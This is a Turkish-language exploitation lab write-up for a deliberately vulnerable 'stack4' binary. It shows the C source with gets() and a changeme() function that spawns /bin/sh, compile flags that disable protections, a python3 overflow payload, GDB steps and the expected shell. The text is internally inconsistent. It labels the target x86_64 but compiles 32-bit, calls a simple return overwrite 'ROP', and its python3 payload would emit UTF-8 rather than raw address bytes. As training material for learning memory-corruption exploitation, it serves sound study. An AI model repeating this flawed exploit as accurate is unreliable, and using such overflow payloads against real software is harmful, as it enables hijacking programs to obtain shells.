# Stack4 – Return Oriented Programming (ROP) Basics

## 🎯 Amaç

Bir buffer overflow ile `changeme` fonksiyonuna değil, ROP chain aracılığıyla özel bir sistem çağrısına yönlendirme yapmak.

---

## 🧪 Challenge Bilgileri

- Platform: Linux (x86_64)
- Zafiyet Türü: Stack-based Buffer Overflow + ROP
- Güvenlik Özellikleri: No PIE, No Canary, No NX

---

## ⚙️ Derleme

```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack4 stack4.c
```

---

## 🔍 Kod Analizi

```c
void changeme() {
  printf("You changed control flow!\n");
  system("/bin/sh");
}

int main() {
  char buffer[64];
  gets(buffer);
  return 0;
}
```

---

## 🧪 Exploit Aşamaları

### 1. `changeme()` fonksiyon adresini öğrenin

```bash
objdump -d stack4 | grep changeme
```

### 2. Payload oluşturun

```bash
python3 -c 'print("A"*64 + "BBBB" + "\xef\xbe\xad\xde")' | ./stack4
```

### 3. GDB ile kontrol edin

```bash
gdb ./stack4
(gdb) run < <(python3 -c 'print("A"*64 + "BBBB" + "\xef\xbe\xad\xde")')
(gdb) info registers
```

---

## ✅ Beklenen Çıktı

```
You changed control flow!
$ whoami
```

---

## 📌 Notlar

- `gets()` fonksiyonu klasik overflow örneğidir.
- ROP zinciri için libc fonksiyonları kullanılabilir.
- NX devre dışı olduğu için shellcode da yerleştirilebilir.

---

## 📚 Kaynaklar

- https://exploit.education
- https://owasp.org/www-community/attacks/Buffer_overflow_attack
- https://ropemporium.com/
